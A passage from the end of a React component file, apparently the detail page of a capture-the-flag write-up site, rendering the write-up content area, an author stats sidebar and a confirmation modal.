                {renderTerminalBlock(contentInfo.payloadTerminal)}

                {renderImportantInfoBox(contentInfo.infoLabel, contentInfo.infoValue)}
              </>
            ) : (
              <p style={{ color: '#64748b', fontStyle: 'italic' }}>No content provided for this writeup.</p>
            )}
          </div>
        )}
      </div>

      {/* Right Sidebar */}
      <div className="writeup-detail-sidebar">
        <div className="sidebar-card">
          <div className="sidebar-author-info">
            <div className="avatar" style={{ width: '52px', height: '52px', borderRadius: '50%', overflow: 'hidden', background: '#1e293b', border: '2px solid rgba(168, 85, 247, 0.4)', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
              {authorProfile?.avatarUrl ? (
                <img 
                  src={authorProfile.avatarUrl} 
                  alt="Profile" 
                  style={{ width: '100%', height: '100%', objectFit: 'cover' }} 
                  onError={(e) => {
                    e.target.onerror = null;
                    e.target.style.display = 'none';
                    if (e.target.nextSibling) e.target.nextSibling.style.display = 'flex';
                  }}
                />
              ) : null}
              <div 
                style={{ 
                  display: authorProfile?.avatarUrl ? 'none' : 'flex',
                  width: '100%', height: '100%', borderRadius: '50%',
                  alignItems: 'center', justifyContent: 'center',
                  backgroundColor: '#1e293b', color: '#a855f7', fontWeight: 'bold', fontSize: '1.2rem'
                }}
              >
                {(authorProfile?.username || writeup.author?.username || 'A').charAt(0).toUpperCase()}
              </div>
            </div>
            <div>
              <div style={{ color: '#fff', fontWeight: 'bold', fontSize: '1.0rem' }}>{authorProfile?.username || writeup.author?.username || 'Unknown'}</div>
              <div style={{ color: '#94a3b8', fontSize: '0.8rem' }}>Rank #{authorProfile?.rank || '--'} - {authorProfile?.writeupCount || 0} writeups</div>
            </div>
          </div>

          <div className="sidebar-stats-grid" style={{ gridTemplateColumns: 'repeat(2, 1fr)', gap: '12px' }}>
            <div className="stat-box">
              <div className="stat-box-label">Likes</div>
              <div className="stat-box-value">{authorProfile?.totalLikes || 0}</div>
            </div>
            <div className="stat-box">
              <div className="stat-box-label">Views</div>
              <div className="stat-box-value">{writeup.views || 0}</div>
            </div>
            <div className="stat-box">
              <div className="stat-box-label">Solves</div>
              <div className="stat-box-value">{authorProfile?.solvesCount || 0}</div>
            </div>
            <div className="stat-box">
              <div className="stat-box-label">Total Points</div>
              <div className="stat-box-value">{authorProfile?.score || 0}</div>
            </div>
          </div>
        </div>
      </div>

      {/* Custom Confirmation Modal */}
      {showConfirmModal && (
        <div style={{
          position: 'fixed',
          top: 0,
          left: 0,
          right: 0,
          bottom: 0,
          background: 'rgba(5, 5, 8, 0.85)',
          backdropFilter: 'blur(8px)',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          zIndex: 9999,
          padding: '20px'
        }}>
          <div style={{
            background: '#0d0f17',
            border: confirmModalConfig.isDanger ? '1px solid rgba(239, 68, 68, 0.3)' : '1px solid rgba(168, 85, 247, 0.3)',
            borderRadius: '12px',
            padding: '24px',
            maxWidth: '440px',
            width: '100%',
            boxShadow: confirmModalConfig.isDanger ? '0 10px 30px rgba(239, 68, 68, 0.15)' : '0 10px 30px rgba(168, 85, 247, 0.15)',
            transform: 'scale(1)',
            transition: 'transform 0.2s ease-out'
          }}>
            <h3 style={{
              margin: '0 0 12px 0',
              color: '#fff',
              fontSize: '1.25rem',
              fontWeight: 700,
              display: 'flex',
              alignItems: 'center',
              gap: '8px'
            }}>
              {confirmModalConfig.isDanger ? '⚠️' : '⚡'} {confirmModalConfig.title}
            </h3>
            <p style={{
              margin: '0 0 24px 0',
              color: '#94a3b8',
              fontSize: '0.92rem',
              lineHeight: '1.6'
            }}>
              {confirmModalConfig.message}
            </p>
            <div style={{
              display: 'flex',
              justifyContent: 'flex-end',
              gap: '12px'
            }}>
              <button
                type="button"
                onClick={() => setShowConfirmModal(false)}
                style={{
                  background: 'rgba(255, 255, 255, 0.03)',
                  border: '1px solid rgba(255, 255, 255, 0.08)',
                  color: '#94a3b8',
                  padding: '10px 18px',
                  borderRadius: '6px',
                  fontSize: '0.85rem',
                  fontWeight: 600,
                  cursor: 'pointer',
                  transition: 'all 0.2s'
                }}
              >
                {confirmModalConfig.cancelText || 'Cancel'}
              </button>
              <button
                type="button"
                onClick={() => {
                  setShowConfirmModal(false);
                  confirmModalConfig.onConfirm();
                }}
                style={{
                  background: confirmModalConfig.isDanger ? 'rgba(239, 68, 68, 0.15)' : 'rgba(168, 85, 247, 0.15)',
                  border: confirmModalConfig.isDanger ? '1px solid rgba(239, 68, 68, 0.4)' : '1px solid rgba(168, 85, 247, 0.4)',
                  color: confirmModalConfig.isDanger ? '#ef4444' : '#a855f7',
                  padding: '10px 22px',
                  borderRadius: '6px',
                  fontSize: '0.85rem',
                  fontWeight: 600,
                  cursor: 'pointer',
                  transition: 'all 0.2s',
                  boxShadow: confirmModalConfig.isDanger ? '0 0 10px rgba(239, 68, 68, 0.1)' : '0 0 10px rgba(168, 85, 247, 0.1)'
                }}
              >
                {confirmModalConfig.confirmText || 'Confirm'}
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

export default WriteupDetail;
